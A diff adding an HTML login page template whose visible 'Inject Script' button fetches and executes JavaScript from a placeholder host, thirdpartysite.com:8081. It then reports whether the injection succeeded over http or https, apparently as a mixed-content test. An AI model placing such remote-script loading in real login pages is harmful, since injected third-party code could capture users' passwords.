@@ -1,0 +1,112 @@
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+
+<html lang="en">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+	<meta http-equiv="Content-Style-Type" content="text/css">
+	<meta http-equiv="Content-Script-Type" content="type">
+
+	<title></title>
+
+
+
+  <style type="text/css">
+  p.true {
+    color: green;
+  }
+  p.false {
+    color: red;
+  }
+
+  </style>
+</head>
+
+<body>
+	<div class="mainContainer">
+		<div class="header">
+
+			<div class="navigation">
+
+			</div>
+		</div>
+
+		<h1></h1>
+
+		<div class="errorMessage" id="errorDiv"	style="display: none;opacity:0;">
+			<p><span class="icon-exclamation-sign icon-2x pull-left"></span>
+
+				<!-- Used for notifications -->
+				<span id="notificationSpan"	style="display: none;"></span>
+
+				<!-- Used for WebSEAL error messages -->
+				<span id="tamErrorMessageSpan" style="display: none;"></span>
+
+				<!-- Used for client-side error messages -->
+				<span id="errorMessageSpan"	style="display: none;"></span>
+
+			</p>
+				<!-- Used for client-side error message attributes -->
+				<span id="errorMessageAttrList"></span>
+		</div>
+
+		<div class="outerContainer">
+			<div class="middleContainer">
+				<div class="innerContainer">
+					<div class="leftColumn">
+						<p></p>
+					</div>
+					<div class="rightColumn">
+						<h2>Login</h2>
+
+						<form method="post" action="https://example.com" class="login"  autocomplete="off">
+							<label for="username">Username</label>
+							<input type="text" id="username" name="username" size="33" maxlength="248" autofocus>
+							<script> /* work around to support focus on IE 7 and 8*/ document.getElementById("username").focus(); </script>
+							<label for="password">Password</label>
+							<input type="password" id="password" name="password" size="33" maxlength="248">
+
+							<input TYPE="HIDDEN" NAME="login-form-type" VALUE="pwd">
+
+							<button type="submit" class="primary button">
+								<span class="icon-signin"></span>  &nbsp;Log In</button>
+						</form>
+
+              <input type="button" class="primary button inject" value="Inject Script" style="padding: 0;"/>
+              <p class="status"></p>
+
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<div class="footer">
+		</div>
+
+		<ul class="links">
+		</ul>
+	</div>
+
+
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+  <script type="text/javascript">
+
+  $(document).ready(function() {
+
+      console.log('ready');
+
+    $('.inject').click(function() {
+
+
+      $.ajax({
+        url: 'http://thirdpartysite.com:8081/script.js',
+        dataType: "script",
+        success: function() {$('p.status').text('Script successfully injected ("http" site)').addClass('true');},
+        error: function() {$('p.status').text('Script failed to inject ("https" site)').addClass('false');}
+      });
+    });
+  });
+  </script>
+
+</body>
+</html>
